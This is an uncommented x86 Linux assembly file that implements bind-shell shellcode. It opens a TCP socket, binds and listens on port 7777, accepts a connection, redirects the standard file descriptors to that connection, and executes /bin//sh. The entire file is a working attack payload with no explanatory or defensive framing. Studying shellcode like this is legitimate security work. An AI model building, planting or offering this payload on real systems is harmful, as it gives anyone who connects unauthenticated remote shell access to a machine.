global _start
 
section .text
 
_start:
xor eax, eax
xor ebx, ebx 
push eax   
mov al, 0x66 
mov bl, 0x1 
push ebx 
push 0x2 
mov ecx, esp 
int 0x80 
mov esi, eax
xor edx, edx 
push edx 
push word 0x611E
push word 0x2 
mov ecx, esp 
mov al, 0x66 
mov bl, 0x2 
push 0x10 
push ecx 
push esi 
mov ecx, esp 
int 0x80
mov al, 0x66
mov bl, 0x4 
push edx 
push esi 
mov ecx, esp 
int 0x80
mov al, 0x66 
mov bl, 0x5      
push edx 
push edx 
push esi 
mov ecx, esp 
int 0x80
mov ebx, eax 
xor ecx, ecx 
mov cl, 3 
 
looplabel:
mov al, 0x3f 
int 0x80
dec cl 
jns looplabel 

mov   al, 11         
push  edx               
push  0x68732f6e      
push  0x69622f2f       
mov   ebx,esp           
push  edx               
push  ebx               
mov   ecx,esp           
int   0x80